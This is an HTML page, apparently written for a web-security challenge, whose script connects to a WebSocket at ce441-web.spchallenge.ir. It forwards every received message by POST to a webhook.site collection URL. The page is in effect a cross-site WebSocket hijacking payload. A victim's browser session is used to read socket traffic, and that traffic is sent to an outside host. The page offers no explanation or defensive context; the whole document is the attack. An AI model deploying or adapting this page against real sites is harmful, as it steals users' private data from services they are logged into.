<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebSocket to Webhook</title>
</head>
<body>
    <h1>WebSocket to Webhook</h1>

    <script>
        // Initialize the WebSocket connection
        const socket = new WebSocket('ws://ce441-web.spchallenge.ir:8080/ws');

        // When the socket opens, log it
        socket.onopen = function(event) {
            console.log('WebSocket connection established');
        };

        // Listen for messages from the WebSocket
        socket.onmessage = function(event) {
            console.log('Message received from WebSocket: ', event.data);

            // Send the received message to the webhook
            sendToWebhook(event.data);
        };

        // Handle socket close
        socket.onclose = function(event) {
            console.log('WebSocket connection closed');
        };

        // Handle socket errors
        socket.onerror = function(error) {
            console.log('WebSocket Error: ', error);
        };

        // Function to send data to the webhook URL
        function sendToWebhook(data) {
            fetch('https://webhook.site/793ce786-73e8-4f90-91dd-68748f201a6a', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    message: data
                })
            })
            .then(response => response.json())
            .then(json => console.log('Data sent to webhook:', json))
            .catch(error => console.error('Error sending data to webhook:', error));
        }
    </script>
</body>
</html>
